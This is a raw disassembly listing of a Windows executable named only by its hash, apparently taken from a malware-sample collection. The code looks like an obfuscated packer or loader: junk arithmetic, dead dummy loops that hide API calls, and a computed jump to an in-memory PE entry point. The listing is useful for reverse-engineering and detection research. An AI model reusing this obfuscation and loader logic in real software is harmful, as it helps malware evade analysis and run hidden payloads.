
1dddf4dc9077931adb5fb379f30a7188bc1def5fc3abd7bc3e5feb5caf79334a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
